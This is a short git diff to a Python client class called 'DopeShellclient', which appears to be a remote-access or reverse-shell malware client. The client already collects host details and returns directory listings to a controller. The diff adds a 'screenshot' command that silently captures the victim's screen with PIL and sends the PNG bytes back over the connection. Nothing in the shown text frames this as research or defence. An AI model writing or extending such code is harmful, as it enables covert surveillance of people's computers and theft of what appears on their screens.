@@ -6,6 +6,8 @@ import os
 import getpass
 import platform
 import sys
+import io
+from PIL import ImageGrab
 import shutil
 import base64
 import struct
@@ -149,7 +151,14 @@ class DopeShellclient:
                     f"Local IP Address: {local_ip}\n"
                 )
                 self.send_data(client_info)
-    
+
+            elif command.lower() == 'screenshot':
+                screenshot = ImageGrab.grab()
+                buffer = io.BytesIO()
+                screenshot.save(buffer, format='PNG')
+                buffer.seek(0)
+                self.send_data(buffer.getvalue())
+
             elif command.lower().startswith('ls'):
                 directory = command.split()[1] if len(command.split()) > 1 else '.'
                 try:
